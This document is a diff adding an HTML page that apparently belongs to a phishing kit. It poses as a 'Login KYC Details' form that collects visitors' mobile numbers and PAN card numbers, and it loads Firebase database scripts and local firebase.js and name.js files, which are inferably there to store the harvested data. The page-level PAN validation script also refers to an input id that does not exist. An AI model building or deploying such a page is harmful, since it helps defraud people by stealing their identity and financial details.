@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>Wellcome</title>
+<meta name="description" content="login">
+<meta name="next-head-count" content="4">
+    
+    <link rel="preload" href="8cc68e2ef518f736.css" as="style">
+
+    
+<link rel="stylesheet" href="8cc68e2ef518f736.css" data-n-g="">
+
+
+    <link rel="icon" type="image/png" sizes="32x32" href="green2.png">
+
+
+    </head><body>
+
+    <div id="">
+    <div class="header">
+        
+    <span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative; max-width: 100%;">
+    <span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; max-width: 100%;"><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27125%27%20height=%2735%27/%3e" style="display: block; max-width: 100%; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px;"></span>
+        
+        
+    <img alt="Logo" src="book.png" decoding="async" data-nimg="intrinsic" class="img-logo" style="width: 0px; position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; height: 0px; min-width: 100%; max-width: 155%; min-height: 155%; max-height: 155%;"></span>
+        
+        
+        </div>
+        
+    <div class="mainContent"><h1 class="text-center">Login KYC Details</h1><div class="card">
+        
+    <form id="ududip007" class="LoginForm" method="post" autocomplete="off">
+  
+    <div class="form-group">
+  
+        
+        
+      <label for="amobile">Mobile number</label>
+      <input type="text" id="amobile" class="new-control" name="mobile"  minlength="10" maxlength="10" required />
+        
+      <BR><BR>  
+        
+    <label for="bpan">PAN Card No</label>
+    <input type="text" id="bpan" class="new-control" name="PANCardNo" pattern="[A-Za-z]{5}[0-9]{4}[A-Za-z]{1}" title="Please enter a valid PAN" minlength="10" maxlength="10" required />
+  </div>
+
+  <script>
+    const panInput = document.getElementById("upan");
+
+    panInput.addEventListener("input", function(event) {
+      const isNumericPortion = this.value.length >= 5 && this.value.length <= 8;
+      if (isNumericPortion) {
+        this.setAttribute("inputmode", "numeric");
+      } else {
+        this.removeAttribute("inputmode");
+      }
+
+      if (!isNumericPortion && !event.data.match(/^[A-Za-z0-9]$/) && event.inputType !== "deleteContentBackward") {
+        event.preventDefault();
+      }
+
+      validatePanNumber(this);
+    });
+
+    function formatAlpha(input) {
+      input.value = input.value.toUpperCase();
+    }
+
+    function validatePanNumber(input) {
+      const panFormat = /^[A-Za-z]{5}\d{4}[A-Za-z]{1}$/;
+
+      if (!panFormat.test(input.value)) {
+        input.setCustomValidity("Please enter a valid PAN number");
+        input.classList.add("error");
+      } else {
+        input.setCustomValidity("");
+        input.classList.remove("error");
+      }
+    }
+  </script>
+
+  <div class="text-center">
+    <button type="submit" class="submit">LOGIN</button>
+  </div>
+</form>
+
+        
+        
+        
+        </div></div></div>
+    
+    <next-route-announcer><p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; width: 1px; white-space: nowrap; overflow-wrap: normal;">Wellcome</p></next-route-announcer>
+    
+    
+    
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1/firebase.js"></script>
+    
+ <script src="firebase.js">  </script>
+<script src="name.js">  </script>
+   
+    
+    </body></html>
